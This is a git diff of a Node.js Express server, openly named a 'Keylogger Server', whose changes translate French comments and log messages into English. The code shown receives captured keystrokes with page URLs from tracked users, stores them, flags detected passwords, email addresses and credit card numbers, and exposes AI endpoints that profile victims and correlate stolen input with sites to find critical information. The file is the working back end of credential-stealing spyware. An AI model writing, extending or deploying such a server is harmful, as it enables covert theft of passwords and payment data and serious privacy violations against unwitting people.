@@ -14,32 +14,32 @@ require('dotenv').config();
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, 'public'))); // Pour servir l'interface admin
+app.use(express.static(path.join(__dirname, 'public'))); // Serve admin interface
 
-// Dossiers
+// Directories
 const LOGS_DIR = path.join(__dirname, 'logs');
 const DATA_DIR = path.join(__dirname, 'data');
 const USERS_DB = path.join(DATA_DIR, 'users.json');
 const AI_CACHE_FILE = path.join(DATA_DIR, "ai-cache.json");
 
-// Créer les dossiers s'ils n'existent pas
+// Create directories if they don't exist
 [LOGS_DIR, DATA_DIR].forEach(dir => {
     if (!fs.existsSync(dir)) {
         fs.mkdirSync(dir, { recursive: true });
     }
 });
 
-// Initialiser la base de données utilisateurs
+// Initialize users database
 if (!fs.existsSync(USERS_DB)) {
     fs.writeFileSync(USERS_DB, JSON.stringify({ users: {} }, null, 2));
 }
 
-// Initialiser le cache IA
+// Initialize AI cache
 if (!fs.existsSync(AI_CACHE_FILE)) {
   fs.writeFileSync(AI_CACHE_FILE, JSON.stringify({ personas: {}, summaries: {}, globalTrends: null }, null, 2));
 }
 
-// Fonctions de base de données
+// Database functions
 function readUsersDB() {
     try {
         const data = fs.readFileSync(USERS_DB, 'utf8');
@@ -81,7 +81,7 @@ function addSession(userId, sessionData) {
     return db.users[userId];
 }
 
-// Fonction pour formater les touches en texte lisible
+// Function to format keystrokes into readable text
 function formatKeystrokes(keystrokes) {
     let text = '';
     keystrokes.forEach(k => {
@@ -175,7 +175,7 @@ function createFormattedTable(pageData) {
 // Route principale
 app.get('/', (req, res) => {
     res.json({
-        message: 'Serveur Keylogger actif',
+        message: 'Keylogger Server active',
         endpoints: {
             'POST /batch-data': 'Enregistrer une session',
             'GET /api/users': 'Liste des utilisateurs',
@@ -186,24 +186,24 @@ app.get('/', (req, res) => {
     });
 });
 
-// Recevoir les données groupées
+// Receive batched data
 app.post('/batch-data', async (req, res) => {
     const pageData = req.body;
 
     if (!pageData || !pageData.url || !pageData.keystrokes || !pageData.userId) {
-        return res.status(400).json({ error: 'Données invalides' });
+        return res.status(400).json({ error: 'Invalid data' });
     }
 
     try {
         // Analyser la sensibilité de la session
         const sensitivity = analyzeSessionSensitivity(pageData);
         
-        // Ajouter le score de sensibilité aux données
+        // Add sensitivity score to data
         pageData.sensitivityScore = sensitivity.score;
         pageData.sensitivityLevel = sensitivity.level;
         pageData.sensitiveData = sensitivity.sensitiveData;
 
-        // Ajouter à la base de données utilisateurs
+        // Add to users database
         const user = addSession(pageData.userId, pageData);
 
         // Créer le fichier TXT
@@ -214,18 +214,18 @@ app.post('/batch-data', async (req, res) => {
         const content = createFormattedTable(pageData);
         fs.writeFileSync(filepath, content, 'utf8');
 
-        console.log(`\n📝 Session enregistrée: ${path.basename(filepath)}`);
-        console.log(`   User: ${pageData.userId} | ${pageData.keystrokes.length} touches sur ${pageData.url}`);
-        console.log(`   🔒 Sensibilité: ${sensitivity.level.toUpperCase()} (score: ${sensitivity.score})`);
+        console.log(`\n📝 Session saved: ${path.basename(filepath)}`);
+        console.log(`   User: ${pageData.userId} | ${pageData.keystrokes.length} keys on ${pageData.url}`);
+        console.log(`   🔒 Sensitivity: ${sensitivity.level.toUpperCase()} (score: ${sensitivity.score})`);
         
         if (sensitivity.sensitiveData.hasPassword) {
-            console.log(`   ⚠️  Mot de passe détecté dans: ${sensitivity.sensitiveData.passwordInputs.join(', ')}`);
+            console.log(`   ⚠️  Password detected in: ${sensitivity.sensitiveData.passwordInputs.join(', ')}`);
         }
         if (sensitivity.sensitiveData.hasEmail) {
-            console.log(`   📧 Email détecté`);
+            console.log(`   📧 Email detected`);
         }
         if (sensitivity.sensitiveData.hasCreditCard) {
-            console.log(`   💳 Carte de crédit détectée!`);
+            console.log(`   💳 Credit card detected!`);
         }
 
         // Analyse IA en arrière-plan (non-bloquant)
@@ -279,7 +279,7 @@ async function analyzeSessionInBackground(session) {
         }
 
         if (alerts.length > 0) {
-            console.log(`🚨 ${alerts.length} alerte(s) détectée(s) dans la session de ${session.userId}`);
+            console.log(`🚨 ${alerts.length} alert(s) detected in ${session.userId}'s session`);
         }
         
     } catch (error) {
@@ -493,7 +493,7 @@ app.get('/api/ai/analyze-user/:userId', async (req, res) => {
             return res.status(404).json({ error: 'Utilisateur non trouvé' });
         }
 
-        console.log(`🤖 Analyse IA de l'utilisateur ${user.userId}...`);
+        console.log(`🤖 AI analysis of user ${user.userId}...`);
         const analysis = await analyzeUserPersona(user);
 
         res.json({
@@ -516,7 +516,7 @@ app.post('/api/ai/analyze-session', async (req, res) => {
             return res.status(400).json({ error: 'Session manquante' });
         }
 
-        console.log(`🤖 Analyse IA de la session sur ${session.url}...`);
+        console.log(`🤖 AI analysis of session on ${session.url}...`);
         const { analyzeSessionType } = require('./ai-analysis');
         const analysis = await analyzeSessionType(session);
 
@@ -541,16 +541,16 @@ app.post('/api/ai/analyze-session', async (req, res) => {
     }
 });
 
-// Corréler les données avec l'URL pour détecter les informations critiques
+// Correlate data with URL to detect critical information
 app.post('/api/ai/correlate-url', async (req, res) => {
     try {
         const { session } = req.body;
 
         if (!session) {
-            return res.status(400).json({ error: 'Session manquante' });
+            return res.status(400).json({ error: 'Missing session' });
         }
 
-        console.log(`🔍 Corrélation IA URL->Données pour ${session.url}...`);
+        console.log(`🔍 AI URL->Data correlation for ${session.url}...`);
         const correlation = await analyzeDataByURL(session);
 
         res.json({
@@ -558,9 +558,9 @@ app.post('/api/ai/correlate-url', async (req, res) => {
             timestamp: new Date().toISOString()
         });
     } catch (error) {
-        console.error('❌ Erreur corrélation URL:', error);
+        console.error('❌ URL correlation error:', error);
         res.status(500).json({ 
-            error: 'Erreur lors de la corrélation des données',
+            error: 'Error during data correlation',
             correlation: {
                 siteType: 'other',
                 siteName: 'Site inconnu',
@@ -597,7 +597,7 @@ app.get('/api/ai/session-summary/:userId/:sessionId', async (req, res) => {
             return res.status(404).json({ error: 'Session non trouvée' });
         }
 
-        console.log(`🤖 Génération résumé IA de la session ${session.sessionId}...`);
+        console.log(`🤖 Generating AI summary for session ${session.sessionId}...`);
         const summary = await generateSessionSummary(session);
 
         res.json({
@@ -617,7 +617,7 @@ app.get('/api/ai/global-trends', async (req, res) => {
         const db = readUsersDB();
         const users = Object.values(db.users);
 
-        console.log(`🤖 Analyse des tendances globales...`);
+        console.log(`🤖 Analyzing global trends...`);
         const trends = await analyzeGlobalTrends(users);
 
         res.json({
@@ -737,21 +737,21 @@ app.get('/api/ai/security-alerts', (req, res) => {
     }
 });
 
-// Démarrer le serveur
+// Start server
 app.listen(PORT, () => {
     console.log(`
 ╔════════════════════════════════════════════╗
-║   🔐 Serveur Keylogger démarré            ║
+║   🔐 Keylogger Server Started              ║
 ║                                            ║
 ║   📡 Port: ${PORT}                            ║
 ║   🌐 URL: http://localhost:${PORT}            ║
 ║   📊 Admin: http://localhost:${PORT}/admin    ║
-║   📁 Logs: ${path.basename(LOGS_DIR)}/                       ║
+║   📁 Logs: logs/                       ║
 ║                                            ║
-║   Prêt à recevoir les données...          ║
+║   Ready to receive data...                 ║
 ╚════════════════════════════════════════════╝
   `);
-    console.log(`📂 Base de données: ${USERS_DB}\n`);
+    console.log(`📂 Database: ${USERS_DB}\n`);
 });
 
 // Gestion de l'arrêt propre
